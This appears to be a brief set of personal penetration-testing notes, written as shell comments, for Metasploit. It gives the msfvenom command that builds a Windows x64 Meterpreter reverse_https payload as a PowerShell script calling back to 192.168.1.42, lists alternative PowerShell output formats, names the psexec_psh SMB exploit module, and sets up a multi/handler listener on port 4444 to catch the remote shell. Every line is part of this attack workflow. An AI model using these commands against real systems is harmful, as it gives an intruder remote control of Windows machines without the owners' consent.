#./msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.42 -f psh > ps_payload64.ps1
# -f powershell (if you want to use it in your script) (shellcode)
# -f psh
# -f psh-net (u can search that on your own time)
# -f psh-reflection 

#exploit/windows/smb/psexec_psh

# use exploit/multi/handler 
# set payload windows/x64/meterpreter/reverse_https
# set lhost 192.168.1.42
# set l port 4444
# run
